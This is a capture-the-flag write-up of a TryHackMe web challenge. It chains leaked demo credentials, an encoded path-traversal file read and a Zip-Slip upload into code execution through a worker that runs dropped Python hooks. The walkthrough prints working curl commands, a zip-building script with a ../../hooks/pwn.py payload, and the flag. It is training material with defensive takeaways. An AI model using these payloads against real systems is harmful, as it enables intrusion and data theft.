| Field | Detail |
|------|--------|
| **Platform** | TryHackMe |
| **Event** | Hacker Holidays 2026 — The Byte Lotus |
| **Day** | 10 |
| **Room** | The Hollow Shell |
| **Category** | Web / Zip-Slip + traversal LFI → theme-worker RCE |
| **Flag format** | `THM{...}` |

---

## Objective

**The Hollow Shell** is a Medium-rated (90 pts) web challenge built around **"Shoreline Display"**, a Flask app served by gunicorn — the Byte Lotus staff portal for publishing in-room "shells" (zip souvenir packs of shoreline ambiance), with SSH also open on `22/tcp`. Guests personalise the in-room tablets by uploading a **shell** (a `.zip` containing a `shell.json` manifest); staff publish them, and a shell may declare optional **automation hooks** that a "theme worker applies for you shortly after." The kill chain combines **Zip-Slip** (unsanitised zip entry paths → arbitrary file write) with a separate out-of-band **theme worker** that executes any `*.py` dropped into a hooks directory. A second bug — an **unvalidated `shell_id`** in the asset route — gives a path-traversal **source-disclosure LFI** that hands you the app and worker source. The objective: _"Slip past what the portal forgets to check, and the shell answers with a shell of your own."_ Get code execution and read the flag.

By the end of this room you will be able to:

- Recover **leaked demo credentials** from a login-page HTML comment and authenticate to a staff portal
- Recognise a **Zip-Slip** flaw where an extractor calls `os.path.join(shell_dir, name)` over raw zip entry names with no `../` check
- Rule out **dead ends** (served-as-text `.py`, manifest `hooks`, template overwrite, zip symlinks, SSH key write, cookie forgery) instead of tunnelling on them
- Turn an unvalidated path identifier into a **source-disclosure LFI** with encoded traversal (`/shells/..%2fapp.py`)
- Chain arbitrary file write into **RCE** by dropping `../../hooks/pwn.py` for an async worker that pipes every `*.py` into `python -`
- **Exfiltrate without egress** by writing output to a web-served file and reading it back over HTTP

> **Authorisation warning:** The techniques below — credential harvesting, Zip-Slip file write, path-traversal LFI and remote code execution — must only ever be run against systems you have **explicit authorization** to test, here the TryHackMe lab. Running them against systems you do not own or control is illegal.

---

## Story Hook

The briefing hides the whole chain in beach imagery: _"You find it on the beach... Slip something inside and hold it to your ear."_ Guests personalise in-room tablets by uploading a **shell** — a `.zip` containing a `shell.json` manifest. Staff publish them; once a shell is _"held to the room's ear it plays its shore."_ A shell may include optional **"automation hooks — the theme worker applies these for you shortly after."**

Each phrase maps to the real vulnerability. _"Slip something inside"_ is the **Zip-Slip** entry-name escape, the _"automation hooks the theme worker applies for you"_ is the out-of-band `*.py` executor, and the manifest `hooks` field itself is the **red herring** — the web app never runs it.

---

## Attack Path

| **1** | **Leaked creds (recon)**<br>The login page HTML source contains a commented "starter login" — `concierge` / `StayNoticed2024!`. Sign in. |
| --- | --- |

| **2** | **Map the app**<br>Only `/login`, `/dashboard`, `/upload`, `/logout`, plus asset serving at `/shells/<id>/<file>`. Upload accepts a `.zip` with a `shell.json` manifest (`name` required; declared `assets` are extension-checked against `png jpg gif svg css json`). |
| --- | --- |

| **3** | **Zip-Slip write**<br>The extractor does `os.path.join(shell_dir, name)` over raw zip entry names with no `../` check, and `os.makedirs` the parent. A zip entry named `../../static/x` lands in the app root's `static/` (served) — confirming arbitrary file write anywhere the app user can reach, including creation of missing dirs. |
| --- | --- |

| **4** | **What DOESN'T work (dead ends)**<br>Uploaded `.py` is served as text (no execution); manifest `hooks`/`command` strings never run (worker isn't the web app); template overwrite doesn't reflect (Jinja caches, `debug=False`, no reloader); zip symlinks aren't honoured (written as plain files); SSH key write fails (app user has no login shell); the hardcoded `secret_key` is real but useless (auth only checks `staff == "concierge"`, which you already are). |
| --- | --- |

| **5** | **Source-disclosure LFI (the unlock)**<br>The asset route `/shells/<shell_id>/<path:asset>` never validates `shell_id`. Encoded traversal `GET /shells/..%2fapp.py` resolves `shell_id=".."` → `send_from_directory(BASE_DIR, "app.py")` and returns the source. Reading `app.py` reveals `HOOKS_DIR = BASE_DIR/hooks` (created, never used by the web app) → there's a separate worker. Reading `theme_worker.py` shows it polls `hooks/*.py` every 20s and pipes each file into `python -` = arbitrary code execution. |
| --- | --- |

| **6** | **Zip-Slip → hooks/ → RCE**<br>Upload a zip whose entry name is `../../hooks/pwn.py` (resolves to `BASE_DIR/hooks/pwn.py`). Within ~20s the worker runs it as `uid=996(roomservice)`. |
| --- | --- |

| **7** | **Exfil (no egress)**<br>The box has no outbound internet, so reverse shells / `curl` callbacks silently fail. Instead the payload finds the app dir, hunts the flag, and writes output into a web-served `shells/pwn/out.txt`, which you read back over HTTP. |
| --- | --- |

| **8** | **Flag**<br>`find / -iname 'flag*'` → `/home/roomservice/flag.txt`. |
| --- | --- |

---

## Walkthrough

The whole exploit is one shell session: authenticate, use the LFI to read the app and worker source, build a Zip-Slip payload with an embedded `python3` heredoc that writes the hook zip, upload it, then read the exfiltrated output back over HTTP.

```bash
$ IP=<machine-ip>

# 0) creds are in the login page HTML comment: concierge / StayNoticed2024!
$ curl -s -c cookies.txt -o /dev/null \
  -d 'username=concierge&password=StayNoticed2024!' http://$IP:5000/login

# 1) source-disclosure LFI via unvalidated shell_id (%2f = '/')
$ curl -s -g --path-as-is "http://$IP:5000/shells/..%2fapp.py"          # app source
$ curl -s -g --path-as-is "http://$IP:5000/shells/..%2ftheme_worker.py" # runs hooks/*.py via `python -` every 20s

# 2) build a shell that Zip-Slips a python hook into BASE_DIR/hooks/
$ python3 - <<'PY'
import zipfile, json
payload = r'''import subprocess
subprocess.run(r"""
d=$(dirname "$(find / -name theme_worker.py 2>/dev/null | head -1)")
mkdir -p "$d/shells/pwn"
{
  echo "id: $(id)"; echo "host: $(hostname)"
  find / -iname 'flag*' -type f 2>/dev/null
  for f in $(find / -iname 'flag*' -type f 2>/dev/null | head -20); do echo "== $f =="; cat "$f" 2>/dev/null; done
} > "$d/shells/pwn/out.txt" 2>&1
chmod -R 755 "$d/shells/pwn"
""", shell=True, executable="/bin/bash")
'''
with zipfile.ZipFile('hook.zip','w') as z:
    z.writestr('shell.json', json.dumps({"name":"x","assets":[]}))
    z.writestr('../../hooks/pwn.py', payload)   # -> BASE_DIR/hooks/pwn.py
print("built hook.zip")
PY

# 3) upload hook.zip via the dashboard, wait ~30-40s (worker polls every 20s)

# 4) read the exfil'd output back over HTTP (no egress needed)
$ curl -s "http://$IP:5000/shells/pwn/out.txt"
# ... == /home/roomservice/flag.txt ==
# THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```

> **Note:** I burned about **an hour** on the `hooks` distraction — every flavour of "hook gymnastics" (command strings, dict shapes, key-name guessing, different working dirs, callbacks) trying to make the manifest execute something. None of it mattered; the web app never touches that field. The moment it clicked to **just read the source** (`/shells/..%2fapp.py`), the whole thing unravelled instantly: the LFI showed the unused `hooks/` dir, the separate `theme_worker.py`, and the intended path. Lesson: **when the front door won't budge and you have any read primitive, read the source before inventing more theories.**

---

## Flag

> **🚩 Flag**
>
> `THM{z1p_sl1pp3d_1nt0_a_sh3ll}`

A pun on **Zip-Slip** landing you a **shell**.

### Key facts

| Item | Value |
|---|---|
| Target | `http://<machine-ip>:5000/` (Flask + gunicorn) · SSH on `22` |
| Creds | `concierge` / `StayNoticed2024!` (HTML comment on `/login`) |
| Upload | `POST /upload`, field `shell` = `.zip` with `shell.json` (`name` required) |
| Bug #1 | **Zip-Slip** in `extract_shell()` — raw `os.path.join(shell_dir, name)`, `makedirs`, no `..` check |
| Bug #2 | **LFI** — `shell_id` unvalidated in `/shells/<shell_id>/<asset>` → `/shells/..%2fapp.py` |
| Executor | `theme_worker.py` polls `BASE_DIR/hooks/*.py` every 20s, runs via `python -` |
| RCE payload | zip entry `../../hooks/pwn.py` → `BASE_DIR/hooks/pwn.py` |
| Exec context | `uid=996(roomservice)` on `tryhackme-2404`; **no outbound egress** |
| Exfil | payload writes `BASE_DIR/shells/pwn/out.txt` → read at `/shells/pwn/out.txt` |
| Flag location | `/home/roomservice/flag.txt` |
| Red herrings | manifest `hooks` field, template overwrite, symlinks-in-zip, SSH key write, cookie forgery |
| Flag | `THM{z1p_sl1pp3d_1nt0_a_sh3ll}` |

---

## Key Takeaways

- **Never trust zip entry names** — validate/normalise every path and reject anything that escapes the target dir (`..`, absolute paths, symlinks). Prefer `zipfile` with an explicit `safe_join`/`os.path.realpath` containment check, not raw `os.path.join`.
- **Validate identifiers used in file paths** — `shell_id` flowed straight into `os.path.join` with no `^[0-9a-f]{12}$` check, turning the asset route into an LFI. `send_from_directory` only protects the `<asset>` segment, not the directory you hand it.
- **Don't build a "trusted" async executor that runs arbitrary code from a shared, writable directory** — the theme worker ran any `*.py` in `hooks/`, so one arbitrary-write bug became full RCE.
- **Extension allow-lists on *declared* assets are meaningless if you extract *every* entry anyway** — the manifest checked declared asset types, but `extract_shell` wrote the whole `namelist()`.
- **Defence-in-depth mattered here:** even with no egress and a nologin service account, source disclosure + local file write was enough. Least-privilege the worker, sandbox it, and don't co-locate a web-writable dir with a code runner.

---

## Final Takeaway

The Hollow Shell shows how two "small" oversights combine into full **remote code execution**. The write primitive is **Zip-Slip** — an extractor that calls `os.path.join` over raw zip entry names with no `../` check, letting an entry named `../../hooks/pwn.py` escape the upload directory and land wherever the app user can reach. On its own that is just arbitrary file write, but a co-located **theme worker** that polls `hooks/*.py` and pipes each file into `python -` turns the write into execution as `roomservice`. The path to understanding all of this was a **source-disclosure LFI**: an unvalidated `shell_id` in the asset route let `/shells/..%2fapp.py` return the app source, revealing the unused hooks directory and the separate worker. With **no outbound egress**, exfiltration came full circle — the payload wrote the flag into a web-served file read back over HTTP. The recurring theme is trust boundaries: never trust **zip entry names** or path **identifiers**, and never wire a **writable directory** into a code runner.

---
*Adapted from the [Hacker Holidays 2026 findings log](https://github.com/Varun-Patkar/HackerHolidays) by Varun Anand Patkar (MIT License).*
